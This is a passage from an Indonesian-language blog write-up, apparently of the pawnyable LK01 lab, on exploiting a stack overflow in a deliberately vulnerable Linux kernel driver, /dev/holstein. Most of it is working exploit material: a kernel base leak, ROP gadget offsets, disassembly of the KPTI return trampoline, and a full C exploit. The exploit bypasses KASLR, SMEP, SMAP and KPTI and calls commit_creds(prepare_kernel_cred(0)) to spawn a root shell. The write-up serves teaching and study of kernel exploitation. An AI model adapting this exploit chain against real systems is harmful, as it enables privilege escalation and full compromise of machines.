    kbase = vfs_read - (0xffffffff8113d33c - 0xffffffff81000000);
    pop_rdi = kbase + 0x27bbdc;
    pop_rcx = kbase + 0x32cdd3;
    mov_rdi_rax_rep_movsq = kbase + 0x60c96b;
    swapgs = kbase + 0x800e26;
    commit_creds = kbase + 0x6e390;
    prepare_kernel_cred = kbase + 0x6e240;

    printf("kbase : 0x%016lx\n" ,kbase);
    printf("vfs_read: 0x%016lx\n" ,vfs_read);
    printf("commit_creds: 0x%016lx\n" ,commit_creds);
    printf("prepare_kernel_cred: 0x%016lx\n" ,prepare_kernel_cred);
    printf("swapgs: 0x%016lx\n" ,swapgs);
    printf("pop_rdi: 0x%016lx\n" ,pop_rdi);
    printf("pop_rcx: 0x%016lx\n" ,pop_rcx);
    printf("mov_rdi_rax_rep_movsq: 0x%016lx\n" ,mov_rdi_rax_rep_movsq);


...
```
dan ini hasil yang didapat:

```bash
$ ./exploit
/dev/holstein terbuka
[*] tahap pertama, leaked
kbase : 0xffffffff81000000
vfs_read: 0xffffffff8113d33c
commit_creds: 0xffffffff8106e390
prepare_kernel_cred: 0xffffffff8106e240
swapgs: 0xffffffff81800e26
pop_rdi: 0xffffffff8127bbdc
pop_rcx: 0xffffffff8132cdd3
mov_rdi_rax_rep_movsq: 0xffffffff8160c96b


```

dengan cara itu, kita bisa melewati KASLR, tapi bagaimana dengan SMEP SMAP dan KPTI? untuk melewati SMEP, didalam tulisan <a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">ini</a> menyebutkan bahwa kita harus menimpa register CR4 (Control Register), tapi sayangnya hal itu sudah tidak bisa lagi, untuk mengetahui selebihnya silahkan <a href="https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/">baca dokumentasi ini</a>, dan catatan penting lainnya dari penulis tantangan ini adalah ```Biasanya, terdapat gadget seperti mov rdi, rax; rep movsq; ret;, yang bisa Anda gunakan untuk meneruskan hasil dari prepare_kernel_cred(NULL) ke commit_creds. Alternatifnya, Anda dapat melewati bagian pertama dari gadget commit_creds dan langsung menjalankannya. Ini dapat berguna ketika Anda tidak dapat menemukan gadget yang sesuai atau ketika Anda ingin memperpendek rantai ROP. Variabel global init_cred berisi struktur kredensial dengan hak akses root. Ini berarti Anda dapat meningkatkan hak istimewa Anda hanya dengan menjalankan mov rdi, rax; call rcx; commit_creds(init_cred).``` yang artinya kita sudah bisa melewati SMEP dan SMAP dengan gadget ```mov rdi, rax; rep movsq; ret;```.

dan untuk KPTI, kita menggunakan gadget```swapgs_restore_regs_and_return_to_usermode``` yang sudah kita siapkan sebelumnya. mari kita lihat apa yang ada dibalik swapgs_restore_regs_and_return_to_usermode itu:

```bash
pwndbg> x/20i 0xffffffff81800e10+22 
   0xffffffff81800e26:	mov    rdi,rsp
   0xffffffff81800e29:	mov    rsp,QWORD PTR gs:0x6004
   0xffffffff81800e32:	push   QWORD PTR [rdi+0x30]
   0xffffffff81800e35:	push   QWORD PTR [rdi+0x28]
   0xffffffff81800e38:	push   QWORD PTR [rdi+0x20]
   0xffffffff81800e3b:	push   QWORD PTR [rdi+0x18]
   0xffffffff81800e3e:	push   QWORD PTR [rdi+0x10]
   0xffffffff81800e41:	push   QWORD PTR [rdi]
   0xffffffff81800e43:	push   rax
   0xffffffff81800e44:	jmp    0xffffffff81800e89
   0xffffffff81800e46:	mov    rdi,cr3
   0xffffffff81800e49:	jmp    0xffffffff81800e7f
   0xffffffff81800e4b:	mov    rax,rdi
   0xffffffff81800e4e:	and    rdi,0x7ff
   0xffffffff81800e55:	bt     QWORD PTR gs:0x1f316,rdi
   0xffffffff81800e5f:	jae    0xffffffff81800e70
   0xffffffff81800e61:	btr    QWORD PTR gs:0x1f316,rdi
   0xffffffff81800e6b:	mov    rdi,rax
   0xffffffff81800e6e:	jmp    0xffffffff81800e78
   0xffffffff81800e70:	mov    rdi,rax
pwndbg> x/2i 0xffffffff81800e46 
   0xffffffff81800e46:	mov    rdi,cr3
   0xffffffff81800e49:	jmp    0xffffffff81800e7f
pwndbg> x/6i 0xffffffff81800e7f
   0xffffffff81800e7f:	or     rdi,0x1000
   0xffffffff81800e86:	mov    cr3,rdi
   0xffffffff81800e89:	pop    rax
   0xffffffff81800e8a:	pop    rdi
   0xffffffff81800e8b:	swapgs
   0xffffffff81800e8e:	jmp    0xffffffff81800eb0
pwndbg> x/3i 0xffffffff81800eb0
   0xffffffff81800eb0:	test   BYTE PTR [rsp+0x20],0x4
   0xffffffff81800eb5:	jne    0xffffffff81800eb9
   0xffffffff81800eb7:	iretq

```
kesimpulannya adalah untuk memperbarui CR3, jadi sekilas sepertinya melompat ke lokasi berikutnya akan mengembalikan direktori halaman ke ruang pengguna walaupun data pada ruang stack kernel tidak dapat direferensikan. jadi, menyalin data yang awalnya ada di tumpukan kernel ke area yang dapat diakses bahkan setelah pembaruan CR3. kita harus melompat ke intruksi berikutnya dalam rop. agar rantai ROP berhasil.

ini adalah kode exploit terakhir kita:
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ERR(msg)                                                               \
  do {                                                                         \
    perror(msg);                                                               \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long prepare_kernel_cred;  //0x6e240
unsigned long commit_creds; //0x6e390
unsigned long pop_rdi; //0x27bbdc
unsigned long pop_rcx; //0x32cdd3
unsigned long mov_rdi_rax_rep_movsq; //0x60c96b
unsigned long swapgs; //0x800e26
unsigned long kbase, vfs_read;
int global_fd;

static void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_rsp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
}

static void shell() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("ROOOOT");
    execve("/bin/sh", argv, envp);
}

void leak()
{
    global_fd = open("/dev/holstein",O_RDWR);
    if(global_fd == -1){
        ERR("open(holstein)");
    }else{
        puts("/dev/holstein terbuka");
    }

    //membocorkan kernel base
    printf("[*] tahap pertama, leaked\n");
    char buff[0x500];
    memset(buff,'A',0x480);
    read(global_fd,buff,0x410);

    for(int i=0;i < 0x480; i++){
       //printf("[*]leaked = 0x%016lx\n",*(unsigned long*)(buff + i * 8) & 0xfff);
       if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x33c){
       vfs_read = *(unsigned long*)(buff + i * 8);
       break;
       }
    }

    kbase = vfs_read - (0xffffffff8113d33c - 0xffffffff81000000);
    pop_rdi = kbase + 0x27bbdc;
    pop_rcx = kbase + 0x32cdd3;
    mov_rdi_rax_rep_movsq = kbase + 0x60c96b;
    swapgs = kbase + 0x800e26;
    commit_creds = kbase + 0x6e390;
    prepare_kernel_cred = kbase + 0x6e240;

    printf("kbase : 0x%016lx\n" ,kbase);
    printf("vfs_read: 0x%016lx\n" ,vfs_read);
    printf("commit_creds: 0x%016lx\n" ,commit_creds);
    printf("prepare_kernel_cred: 0x%016lx\n" ,prepare_kernel_cred);
    printf("swapgs: 0x%016lx\n" ,swapgs);
    printf("pop_rdi: 0x%016lx\n" ,pop_rdi);
    printf("pop_rcx: 0x%016lx\n" ,pop_rcx);
    printf("mov_rdi_rax_rep_movsq: 0x%016lx\n" ,mov_rdi_rax_rep_movsq);
    
}

void rop()
{
    puts("[+]tahap kedua, rop");
    char buff[0x500];
    memset(buff,'B',0x480);

    unsigned long *rop = (unsigned long*)(buff + 0x408);
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx;
    *rop++ = 0;
    *rop++ = mov_rdi_rax_rep_movsq;
    *rop++ = commit_creds;
    *rop++ = swapgs;
    *rop++ = 0xdeadbeef;
    *rop++ = 0xdeadbeef;
    *rop++ = (unsigned long)shell; //[rdi+0x10]
    *rop++ = user_cs; //[rdi+0x18 ]
    *rop++ = user_rflags; //[rdi+0x20]
    *rop++ = user_rsp;  //[rdi+0x28]
    *rop++ = user_ss; //[rdi+0x30]
    
    write(global_fd,buff,(void*)rop-(void*)buff);
}


int main()
{
    save_state();

    leak();
    
    rop();

    close(global_fd);

    return EXIT_SUCCESS;
}


```
sebelum menjalankan exploitnya, kita harus kembali mengubah setidguid ke 1337 di rootfs/etc/init.d/S99pawnyable, aktifkan semua mitigasi pada run.sh

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=1 kaslr" \
    -no-reboot \
    -cpu qemu64,+smap,+smep \
    -smp 1 \
    -monitor /dev/null \
    -initrd rootfs_updated.cpio \
    -net nic,model=virtio \
    -net user

```
dan ini hasilnya

<img src="{{ site.url }}{{ site.baseurl }}/images/kernel-pwn-overflow-root.jpg" alt="">


---

Referensi
---

<a href="https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html">https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html</a>

<a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/</a>

<a href="https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/">https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/</a>


---
